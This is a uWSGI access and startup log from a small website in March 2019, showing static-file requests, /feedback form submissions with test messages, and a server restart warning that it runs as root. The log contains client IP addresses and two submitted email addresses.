+[pid: 1421|app: 0|req: 2/2] 114.216.151.15 () {48 vars in 782 bytes} [Sat Mar 23 12:56:05 2019] GET /static/css/bootstrap.css => generated 141622 bytes in 11 msecs via sendfile() (HTTP/1.1 200) 8 headers in 305 bytes (0 switches on core 3)
+[pid: 1420|app: 0|req: 1/3] 114.216.151.15 () {48 vars in 788 bytes} [Sat Mar 23 12:56:05 2019] GET /static/css/font-awesome.css => generated 35134 bytes in 12 msecs via sendfile() (HTTP/1.1 200) 8 headers in 303 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 3/4] 114.216.151.15 () {48 vars in 780 bytes} [Sat Mar 23 12:56:05 2019] GET /static/css/chocolat.css => generated 1951 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 301 bytes (0 switches on core 2)
+[pid: 1421|app: 0|req: 5/5] 114.216.151.15 () {48 vars in 776 bytes} [Sat Mar 23 12:56:06 2019] GET /static/css/italic.css => generated 12217 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 5/6] 114.216.151.15 () {48 vars in 804 bytes} [Sat Mar 23 12:56:06 2019] GET /static/css/easy-responsive-tabs.css => generated 5672 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 2/7] 114.216.151.15 () {48 vars in 774 bytes} [Sat Mar 23 12:56:06 2019] GET /static/css/style.css => generated 56231 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 302 bytes (0 switches on core 3)
+[pid: 1421|app: 0|req: 6/8] 114.216.151.15 () {48 vars in 776 bytes} [Sat Mar 23 12:56:07 2019] GET /static/css/family.css => generated 3082 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 300 bytes (0 switches on core 3)
+[pid: 1420|app: 0|req: 3/9] 114.216.151.15 () {48 vars in 783 bytes} [Sat Mar 23 12:56:08 2019] GET /static/js/modernizr-2.6.2.min.js => generated 15414 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 1420|app: 0|req: 4/10] 114.216.151.15 () {48 vars in 805 bytes} [Sat Mar 23 12:56:08 2019] GET /static/images/banner1.jpg => generated 246709 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 1421|app: 0|req: 7/11] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:56:09 2019] GET /static/images/c3.png => generated 14458 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 1420|app: 0|req: 5/12] 114.216.151.15 () {48 vars in 777 bytes} [Sat Mar 23 12:56:12 2019] GET /static/js/jquery-2.1.4.min.js => generated 84345 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 6/13] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 12:56:20 2019] GET /static/js/jquery.picEyes.js => generated 2938 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 3)
+[pid: 1421|app: 0|req: 9/14] 114.216.151.15 () {48 vars in 785 bytes} [Sat Mar 23 12:56:24 2019] GET /static/js/responsiveslides.min.js => generated 3397 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 8/15] 114.216.151.15 () {48 vars in 761 bytes} [Sat Mar 23 12:56:24 2019] GET /static/js/move-top.js => generated 1330 bytes in 4 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 0)
+[pid: 1420|app: 0|req: 8/16] 114.216.151.15 () {48 vars in 757 bytes} [Sat Mar 23 12:56:24 2019] GET /static/js/easing.js => generated 4758 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 2)
+[pid: 1421|app: 0|req: 9/17] 114.216.151.15 () {48 vars in 775 bytes} [Sat Mar 23 12:56:24 2019] GET /static/js/jquery.chocolat.js => generated 10203 bytes in 5 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 0)
+[pid: 1420|app: 0|req: 9/18] 114.216.151.15 () {50 vars in 872 bytes} [Sat Mar 23 12:56:26 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 18028 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 10/19] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:56:26 2019] GET /static/images/t3.jpg => generated 29498 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 1421|app: 0|req: 10/20] 114.216.151.15 () {50 vars in 872 bytes} [Sat Mar 23 12:56:26 2019] GET /static/fonts/fontawesome-webfont.woff2?v=4.6.3 => generated 71896 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 2)
+[pid: 1421|app: 0|req: 11/21] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:56:37 2019] GET /static/images/t4.jpg => generated 31577 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 3)
+[pid: 1421|app: 0|req: 12/22] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:56:39 2019] GET /static/images/t1.jpg => generated 57504 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 11/23] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:56:39 2019] GET /static/images/c1.png => generated 21632 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 13/24] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 12:56:45 2019] GET / => generated 19993 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 1421|app: 0|req: 14/25] 114.216.151.15 () {48 vars in 775 bytes} [Sat Mar 23 12:56:46 2019] GET /static/js/jquery.chocolat.js => generated 10203 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 2)
+[pid: 1420|app: 0|req: 13/26] 114.216.151.15 () {48 vars in 757 bytes} [Sat Mar 23 12:56:46 2019] GET /static/js/easing.js => generated 4758 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 13/27] 114.216.151.15 () {52 vars in 887 bytes} [Sat Mar 23 12:56:46 2019] GET /static/images/banner1.jpg => generated 1 bytes in 5 msecs (HTTP/1.1 206) 9 headers in 343 bytes (1 switches on core 2)
+[pid: 1421|app: 0|req: 15/28] 114.216.151.15 () {50 vars in 872 bytes} [Sat Mar 23 12:56:47 2019] GET /static/fonts/glyphicons-halflings-regular.woff2 => generated 18028 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 304 bytes (0 switches on core 3)
+[pid: 1420|app: 0|req: 14/29] 114.216.151.15 () {48 vars in 753 bytes} [Sat Mar 23 12:56:47 2019] GET /static/js/main.js => generated 3260 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 315 bytes (0 switches on core 3)
+[pid: 1421|app: 0|req: 16/30] 114.216.151.15 () {48 vars in 785 bytes} [Sat Mar 23 12:56:47 2019] GET /static/js/easy-responsive-tabs.js => generated 6489 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 314 bytes (0 switches on core 0)
+[pid: 1420|app: 0|req: 16/31] 114.216.151.15 () {48 vars in 783 bytes} [Sat Mar 23 12:56:49 2019] GET /static/js/bootstrap-3.1.1.min.js => generated 29110 bytes in 0 msecs via sendfile() (HTTP/1.1 200) 8 headers in 317 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 16/32] 114.216.151.15 () {48 vars in 817 bytes} [Sat Mar 23 12:56:49 2019] GET /static/images/arr.png => generated 861 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 284 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 17/33] 114.216.151.15 () {48 vars in 823 bytes} [Sat Mar 23 12:56:50 2019] GET /static/images/arrows.png => generated 4243 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 287 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 18/34] 114.216.151.15 () {52 vars in 887 bytes} [Sat Mar 23 12:56:50 2019] GET /static/images/banner1.jpg => generated 115975 bytes in 7 msecs (HTTP/1.1 206) 9 headers in 348 bytes (214 switches on core 2)
+[pid: 1420|app: 0|req: 17/35] 114.216.151.15 () {48 vars in 799 bytes} [Sat Mar 23 12:57:03 2019] GET / => generated 19993 bytes in 39 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 1421|app: 0|req: 21/36] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:03 2019] GET /static/images/t2.jpg => generated 66622 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 289 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 21/37] 114.216.151.15 () {52 vars in 873 bytes} [Sat Mar 23 12:57:03 2019] GET /static/images/t1.jpg => generated 1 bytes in 3 msecs (HTTP/1.1 206) 9 headers in 338 bytes (1 switches on core 1)
+[pid: 1420|app: 0|req: 18/38] 114.216.151.15 () {52 vars in 873 bytes} [Sat Mar 23 12:57:03 2019] GET /static/images/c1.png => generated 1 bytes in 6 msecs (HTTP/1.1 206) 9 headers in 337 bytes (1 switches on core 3)
+[pid: 1421|app: 0|req: 21/39] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:03 2019] GET /static/images/c2.png => generated 21112 bytes in 8 msecs via sendfile() (HTTP/1.1 200) 8 headers in 288 bytes (0 switches on core 3)
+[pid: 1421|app: 0|req: 22/40] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:09 2019] GET /static/images/g3.jpg => generated 93835 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 1420|app: 0|req: 19/41] 114.216.151.15 () {48 vars in 815 bytes} [Sat Mar 23 12:57:09 2019] GET /feedback => generated 2349 bytes in 6 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 2)
+[pid: 1420|app: 0|req: 22/42] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:09 2019] GET /static/images/g4.jpg => generated 61003 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 1421|app: 0|req: 24/43] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:09 2019] GET /static/images/g5.jpg => generated 51280 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 0)
+Sat Mar 23 12:57:09 2019 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 429] during GET /static/images/c1.png (114.216.151.15)
+IOError: write error
+[pid: 1421|app: 0|req: 24/45] 114.216.151.15 () {52 vars in 873 bytes} [Sat Mar 23 12:57:09 2019] GET /static/images/c1.png => generated 3742 bytes in 6 msecs (HTTP/1.1 206) 9 headers in 340 bytes (15 switches on core 1)
+[pid: 1420|app: 0|req: 22/45] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:09 2019] GET /static/images/g6.jpg => generated 58254 bytes in 6 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 0)
+[pid: 1420|app: 0|req: 22/46] 114.216.151.15 () {52 vars in 873 bytes} [Sat Mar 23 12:57:09 2019] GET /static/images/t1.jpg => generated 41455 bytes in 6 msecs (HTTP/1.1 206) 9 headers in 342 bytes (95 switches on core 3)
+[pid: 1421|app: 0|req: 25/47] 114.216.151.15 () {50 vars in 844 bytes} [Sat Mar 23 12:57:16 2019] GET / => generated 19993 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 1421|app: 0|req: 26/48] 114.216.151.15 () {52 vars in 873 bytes} [Sat Mar 23 12:57:18 2019] GET /static/images/c1.png => generated 1 bytes in 1 msecs (HTTP/1.1 206) 9 headers in 337 bytes (1 switches on core 2)
+[pid: 1420|app: 0|req: 23/49] 114.216.151.15 () {52 vars in 873 bytes} [Sat Mar 23 12:57:18 2019] GET /static/images/t1.jpg => generated 1 bytes in 1 msecs (HTTP/1.1 206) 9 headers in 338 bytes (1 switches on core 1)
+[pid: 1420|app: 0|req: 24/50] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:19 2019] GET /static/images/g1.jpg => generated 150373 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 27/51] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:19 2019] GET /static/images/g2.jpg => generated 116260 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 28/52] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:20 2019] GET /static/images/g3.jpg => generated 93835 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 25/53] 114.216.151.15 () {52 vars in 873 bytes} [Sat Mar 23 12:57:20 2019] GET /static/images/c1.png => generated 5582 bytes in 2 msecs (HTTP/1.1 206) 9 headers in 340 bytes (21 switches on core 3)
+[pid: 1421|app: 0|req: 29/54] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:20 2019] GET /static/images/g4.jpg => generated 61003 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 1421|app: 0|req: 30/55] 114.216.151.15 () {52 vars in 873 bytes} [Sat Mar 23 12:57:20 2019] GET /static/images/t1.jpg => generated 41455 bytes in 2 msecs (HTTP/1.1 206) 9 headers in 342 bytes (95 switches on core 2)
+[pid: 1420|app: 0|req: 26/56] 114.216.151.15 () {48 vars in 825 bytes} [Sat Mar 23 12:57:30 2019] GET /static/images/contact.jpg => generated 248074 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 2)
+[pid: 1421|app: 0|req: 31/57] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 12:57:31 2019] GET /static/images/g10.jpg => generated 52572 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 0)
+[pid: 1420|app: 0|req: 27/58] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 12:57:31 2019] GET /static/images/g12.jpg => generated 78872 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 1421|app: 0|req: 32/59] 114.216.151.15 () {48 vars in 797 bytes} [Sat Mar 23 12:57:32 2019] GET /static/images/g11.jpg => generated 92667 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 3)
+[pid: 1421|app: 0|req: 33/60] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:34 2019] GET /static/images/g6.jpg => generated 58254 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 1)
+[pid: 1421|app: 0|req: 34/61] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:40 2019] GET /static/images/g5.jpg => generated 51280 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 290 bytes (0 switches on core 2)
+[pid: 1420|app: 0|req: 28/63] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:41 2019] GET /static/images/g8.jpg => generated 137648 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 35/63] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:41 2019] GET /static/images/g9.jpg => generated 135997 bytes in 2 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 0)
+[pid: 1421|app: 0|req: 36/64] 117.136.8.52 () {46 vars in 733 bytes} [Sat Mar 23 12:57:41 2019] GET / => generated 19993 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 1420|app: 0|req: 29/65] 114.216.151.15 () {48 vars in 821 bytes} [Sat Mar 23 12:57:44 2019] GET /static/images/close.png => generated 499 bytes in 1 msecs via sendfile() (HTTP/1.1 200) 8 headers in 285 bytes (0 switches on core 3)
+[pid: 1421|app: 0|req: 37/66] 114.216.151.15 () {48 vars in 795 bytes} [Sat Mar 23 12:57:44 2019] GET /static/images/g7.jpg => generated 114672 bytes in 3 msecs via sendfile() (HTTP/1.1 200) 8 headers in 292 bytes (0 switches on core 1)
+[pid: 1420|app: 0|req: 30/67] 117.136.8.52 () {46 vars in 749 bytes} [Sat Mar 23 12:57:50 2019] GET /feedback => generated 2349 bytes in 1 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 2)
+[pid: 1420|app: 0|req: 31/68] 117.136.8.52 () {48 vars in 778 bytes} [Sat Mar 23 12:57:56 2019] GET / => generated 19993 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 1421|app: 0|req: 38/69] 117.136.8.52 () {48 vars in 913 bytes} [Sat Mar 23 12:58:32 2019] GET /feedback?name=%E6%9D%8E%E8%B6%85%E7%BE%A4&email=li%40zz.com&message=rrrr => generated 2349 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 2)
+[pid: 1421|app: 0|req: 39/70] 117.136.8.52 () {48 vars in 842 bytes} [Sat Mar 23 12:58:38 2019] GET / => generated 19993 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+SIGINT/SIGQUIT received...killing workers...
+worker 1 buried after 1 seconds
+worker 2 buried after 1 seconds
+goodbye to uWSGI.
+[uWSGI] getting INI configuration from /var/www/xinminhao/uwsgi.ini
+*** Starting uWSGI 2.0.18 (64bit) on [Sat Mar 23 12:59:58 2019] ***
+compiled with version: 6.3.0 20170516 on 21 March 2019 13:18:56
+os: Linux-4.9.0-8-amd64 #1 SMP Debian 4.9.110-3+deb9u6 (2018-10-08)
+nodename: xinminhao
+machine: x86_64
+clock source: unix
+detected number of CPU cores: 1
+current working directory: /
+detected binary path: /root/venv/bin/uwsgi
+!!! no internal routing support, rebuild with pcre support !!!
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+chdir() to /var/www/xinminhao/
+your processes number limit is 3898
+your memory page size is 4096 bytes
+detected max file descriptor number: 1024
+lock engine: pthread robust mutexes
+thunder lock: disabled (you can enable it with --thunder-lock)
+uwsgi socket 0 bound to TCP address 127.0.0.1:8001 fd 3
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+Python version: 2.7.13 (default, Sep 26 2018, 18:42:22)  [GCC 6.3.0 20170516]
+Python main interpreter initialized at 0x558f103e1780
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+python threads support enabled
+your server socket listen backlog is limited to 100 connections
+your mercy for graceful operations on workers is 60 seconds
+mapped 312672 bytes (305 KB) for 8 cores
+*** Operational MODE: preforking+threaded ***
+WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x558f103e1780 pid: 1458 (default app)
+uWSGI running as root, you can use --uid/--gid/--chroot options
+*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
+*** uWSGI is running in multiple interpreter mode ***
+spawned uWSGI master process (pid: 1458)
+spawned uWSGI worker 1 (pid: 1477, cores: 4)
+spawned uWSGI worker 2 (pid: 1478, cores: 4)
+*** Stats server enabled on 127.0.0.1:9191 fd: 11 ***
+[pid: 1477|app: 0|req: 2/1] 114.216.151.15 () {48 vars in 773 bytes} [Sat Mar 23 13:01:17 2019] GET / => generated 19922 bytes in 37 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 3)
+[pid: 1477|app: 0|req: 3/2] 114.216.151.15 () {48 vars in 815 bytes} [Sat Mar 23 13:01:55 2019] GET /feedback => generated 2349 bytes in 10 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 2)
+[pid: 1477|app: 0|req: 4/3] 114.216.151.15 () {50 vars in 844 bytes} [Sat Mar 23 13:02:01 2019] GET / => generated 19922 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
+[pid: 1478|app: 0|req: 1/4] 114.216.151.15 () {50 vars in 844 bytes} [Sat Mar 23 13:02:04 2019] GET / => generated 19922 bytes in 41 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 0)
+[pid: 1477|app: 0|req: 6/5] 114.216.151.15 () {50 vars in 955 bytes} [Sat Mar 23 13:02:32 2019] GET /feedback?name=xinminhao&email=leecqchn%40163.com&message=asd => generated 2349 bytes in 3 msecs (HTTP/1.1 200) 2 headers in 81 bytes (1 switches on core 2)
+[pid: 1477|app: 0|req: 7/6] 114.216.151.15 () {50 vars in 896 bytes} [Sat Mar 23 13:02:46 2019] GET / => generated 19922 bytes in 2 msecs (HTTP/1.1 200) 2 headers in 82 bytes (1 switches on core 1)
